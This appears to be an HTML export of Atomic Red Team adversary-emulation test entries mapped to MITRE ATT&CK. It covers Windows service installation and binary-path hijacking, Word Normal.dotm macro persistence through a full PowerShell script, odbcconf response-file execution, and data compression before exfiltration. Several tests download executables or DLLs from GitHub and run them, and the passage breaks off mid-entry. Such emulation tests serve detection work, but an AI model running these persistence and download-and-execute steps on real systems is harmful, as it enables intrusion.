<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77</li>
<li><strong>name</strong>: Service Installation PowerShell</li>
<li>
<p><strong>description</strong>: Installs A Local Service via PowerShell.
Upon successful execution, powershell will download <code>AtomicService.exe</code> from github. Powershell will then use <code>New-Service</code> and <code>Start-Service</code> to start service. Results will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
Start-Service -Name "#{service_name}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{binary_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Stop-Service -Name "#{service_name}" 2&gt;&amp;1 | Out-Null
try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
catch {}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1543.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: fb4151a2-db33-4f8c-b7f8-78ea8790f961</li>
<li><strong>name</strong>: Remote Service Installation CMD</li>
<li>
<p><strong>description</strong>: Download an executable from github and start it as a service on a remote endpoint
Upon successful execution, powershell will download <code>AtomicService.exe</code> from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: sc.exe \#{remote_host} create #{service_name} binPath= "#{binary_path}" start=#{startup_type} type=#{service_type}
sc.exe \#{remote_host} start #{service_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{binary_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: sc.exe \#{remote_host} stop #{service_name} &gt;nul 2&gt;&amp;1
sc.exe \#{remote_host} delete #{service_name} &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1543.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1f896ce4-8070-4959-8a25-2658856a70c9</li>
<li><strong>name</strong>: Modify Service to Run Arbitrary Binary (Powershell)</li>
<li>
<p><strong>description</strong>: This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.
This technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. 
<a href="https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/">Reference</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: Stop-Service -Name "#{service_name}" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name "#{service_name}" -path "#{new_bin_path}"
start-service -Name "#{service_name}" -erroraction silentlycontinue | out-null</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Stop-Service -Name "#{service_name}" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name "#{service_name}" -path "#{original_bin_path}" -erroraction silentlycontinue | out-null</li>
<li><strong>mitre_id</strong>: T1543.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 940db09e-80b6-4dd0-8d4d-7764f89b47a8</li>
<li><strong>name</strong>: Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell</li>
<li>
<p><strong>description</strong>: Injects a Macro in the Word default template "Normal.dotm" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: # Registry setting to "Trust access to the VBA project object model" in Word
$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
$registryValue = "AccessVBOM"
$registryData = "1"</li>
</ul>
<h1>The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0</h1>
<p>$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"</p>
<h1>Get the value of the Key/Value pair</h1>
<p>$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue</p>
<h1>Logical operation to: if the value of the key/value is 1, do nothing -</h1>
<h1>if the value is 0, change it to 1 and create flag1 -</h1>
<h1>if it doesn't exist, create the value and flag2</h1>
<p>if ($value -eq "1") 
{
  Write-Host "The registry value '$registryValue' already exists with the required setting."
} <br />
  elseif ($value -eq "0") 
{
  Write-Host "The registry value was set to 0, temporarily changing to 1."
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo "flag1" &gt; $flagPath1
} 
  else 
{
  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo "flag2" &gt; $flagPath2
}
Add-Type -AssemblyName Microsoft.Office.Interop.Word</p>
<h1>Define the path of copied normal template for restoral</h1>
<p>$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"</p>
<h1>Define the path to the normal template</h1>
<p>$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"</p>
<h1>Create copy of orginal template for restoral</h1>
<p>Copy-Item -Path $docPath -Destination $copyPath -Force</p>
<h1>VBA code to be insterted as a Macro</h1>
<h1>Will create a scheduled task to open the Calculator at 8:04pm daily</h1>
<p>$vbaCode = @"
  Sub AutoExec()
  Dim applicationPath As String
  Dim taskName As String
  Dim runTime As String
  Dim schTasksCmd As String
  applicationPath = "C:\Windows\System32\calc.exe"
  taskName = "OpenCalcTask"
  runTime = "20:04"
  schTasksCmd = "schtasks /create /tn """ &amp; taskName &amp; """ /tr """ &amp; applicationPath &amp; """ /sc daily /st " &amp; runTime &amp; " /f"
  Shell "cmd.exe /c " &amp; schTasksCmd, vbNormalFocus
  End Sub
"@</p>
<h1>Create a new instance of Word.Application</h1>
<p>$word = New-Object -ComObject Word.Application</p>
<h1>Keep the Word application hidden</h1>
<p>$word.Visible = $false</p>
<h1>Open the document</h1>
<p>$document = $word.Documents.Open($docPath)</p>
<h1>Access the VBA project of the document</h1>
<p>$vbaProject = $document.VBProject</p>
<h1>Add a new module to the VBA project</h1>
<p>$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule</p>
<h1>Add the VBA code to the new module</h1>
<p>$newModule.CodeModule.AddFromString($vbaCode)</p>
<h1>Run the Macro</h1>
<p>$word.run("AutoExec")</p>
<h1>Save and close the document</h1>
<p>$document.SaveAs($docPath)
$document.Close()</p>
<h1>Quit Word</h1>
<p>$word.Quit()</p>
<h1>Release COM objects</h1>
<p>[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host "You will need to install Microsoft Word manually to meet this requirement"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: # Registry setting to "Trust access to the VBA project object model" in Word
$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
$registryValue = "AccessVBOM"
$registryData1 = "1"
$registryData0 = "0"</p>
</li>
</ul>
<h1>Defines the path each flag file created depending on the original registry state</h1>
<p>$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"</p>
<h1>Define the path of copied normal template for restoral</h1>
<p>$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"</p>
<h1>Define the path to the normal template</h1>
<p>$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"</p>
<h1>Delete the scheduled task created by the Macro</h1>
<p>schtasks /Delete /TN "OpenCalcTask" /F | Out-Null</p>
<h1>Restore the orginal template if the backup copy exists</h1>
<p>if (Test-Path $copyPath)
{
  #Delete the injected template
  Remove-Item -Force $docPath -ErrorAction SilentlyContinue
  # Restore the original template
  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue
  Write-Host "The original template has been restored"
}
  else
{
  Write-Host "The original template is present"
}</p>
<h1>Restore the original state of the registry key</h1>
<p>if (Test-Path $flagPath1) 
{
  # The value was originally 0, set back to 0
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null
  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue
  Write-Host "The original registry state has been restored"
} 
  elseif (Test-Path $flagPath2)
{
  #The value did not previously exist, delete the value
  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null
  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null
  Write-Host "The original registry state has been restored"
}
  else 
{
  # The value was already 1, do nothing
  Write-Host "The value $registryValue already existed in $registryKey."
}</p>
<ul>
<li><strong>mitre_id</strong>: T1137.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 331ce274-f9c9-440b-9f8c-a1006e1fce0b</li>
<li><strong>name</strong>: Odbcconf.exe - Load Response File</li>
<li>
<p><strong>description</strong>: Execute arbitrary response file that will spawn PowerShell.exe.
Source files: https://github.com/woanware/application-restriction-bypasses</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: cd "#{rsp_file_path}"
odbcconf.exe -f "#{rsp_file_name}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{rsp_file_path}#{rsp_file_name}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp" -OutFile "#{rsp_file_path}#{rsp_file_name}"
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll" -OutFile "#{rsp_file_path}\o.dll"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1218.008</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 41410c60-614d-4b9d-b66e-b0192dd9c597</li>
<li><strong>name</strong>: Compress Data for Exfiltration With PowerShell</li>
<li>
<p><strong>description</strong>: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.
When the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory </p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Remove-Item -path #{output_file} -ErrorAction Ignore</li>
<li><strong>mitre_id</strong>: T1560</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'Path where resulting compressed data should be placed', 'type': 'path', 'default': '$env:USERPROFILE\T1560-data-ps.zip'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
